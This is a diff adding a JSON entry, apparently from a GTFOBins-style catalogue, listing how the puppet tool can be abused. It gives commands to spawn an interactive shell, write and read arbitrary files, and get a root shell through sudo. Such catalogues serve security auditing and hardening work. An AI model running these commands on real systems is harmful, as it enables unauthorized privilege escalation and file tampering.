@@ -1,0 +1,26 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "The file path must be absolute.",
+        "code": "puppet apply -e \"file { '[file]': content => 'DATA' }\"\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "The read file content is corrupted by the `diff` output format. The actual '/usr/bin/diff' command is executed.",
+        "code": "puppet filebucket -l diff /dev/null [file]\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
+      }
+    ]
+  }
+}
